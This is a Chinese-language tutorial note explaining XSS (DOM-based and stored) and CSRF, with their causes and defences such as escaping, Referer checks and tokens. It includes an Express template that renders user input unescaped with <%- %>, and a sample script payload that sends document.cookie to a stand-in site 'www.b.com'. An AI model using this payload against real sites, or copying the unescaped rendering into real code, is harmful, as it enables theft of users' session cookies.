# XSS和CSRF
## XSS 
- ### 简介
XSS是Cross SiteScript（跨站脚本攻击）的缩写。XSS是程序中常见的漏洞，属于被动式且用于客户端的攻击方式。
- ### 原理
XSS的原理是攻击者向有XSS漏洞的网站中输入恶意的HTML代码，这段代码会自动执行从而达到攻击的目的。例如盗取用户的Cookie、破坏页面结构、重定向到其他网站。
- ### 分类
#### 1、DOM Based XSS
DOM Based XSS是一种基于网页DOM结构的攻击，特点是只攻击少数人。

考虑如下场景：网站a的某个页面可以接受一个参数，并根据参数做出相应的显示：

```
// 输入的url
http://www.a.com?content='aaa'

// 显示模板 template
<html>
    <head>
        <title>demo</title>
    </head>
    <body>
        <p><%- content %></p>
    </body>
</html>

// 后端逻辑
app.get('/', (req, res, next) => {
    let content = req.query.content
    res.render('template', {
        content: content
    })
})
```
这看起来很正常，接受一个参数并且显示出来。但是假如有不怀好意者向用户a发送了一个连接（http://www.a.com?content=<script>window.open("www.b.com?param="+document.cookie)</script>），如果用户a点击了这个链接那么他的Cookie信息便被发送到了网站b。

#### 2、Stored XSS
Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。

考虑如下场景：有一论坛提供博客留言功能，假如有不怀好意者在文章a下面输入这样的留言：

```
<script>window.open("www.b.com?param="+document.cookie)</script>
```
假如服务端不做验证就插入了数据库，那么当其他用户浏览文章a的时候便可能泄露自己的Cookie信息。

- ### 防范
我们经常听到一句话：永远不要相信用户的输入，以前不是很理解这句话的意思，这里刚好也算是验证了。

最简单的方法是对标签进行转义，例如 

```
< 对应 &lt; 
> 对应 &gt;
```

## CSRF
- ### 简介
CSRF是Cross-site request forgery（跨站请求伪造）的缩写，是一种对网站的恶意利用。
- ### 原理
CSRF攻击是源于WEB的隐式身份验证机制。WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。这句话很重要。

![image](http://s3.51cto.com/wyfs01/M01/16/0C/wKioOVIRjQvjAVsIAABvQu7p_VI704.jpg)

1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;

2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;

3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B;

4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A;

5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

- ### 防范
1. 验证HTTP Referer字段

在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。而CSRF攻击的必要条件是攻击者在自己的网站伪造请求，所以服务端通过验证Referer判断请求是否来自安全域。

2. 在请求地址中添加token并验证

CSRF攻击成功的先决条件是验证信息全部放在Cookie中，那么只要我们在验证Cookie之前再添加一步验证，且验证信息不是存放在cookie中就可以有效规避CSRF攻击。怎么实现呢？可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。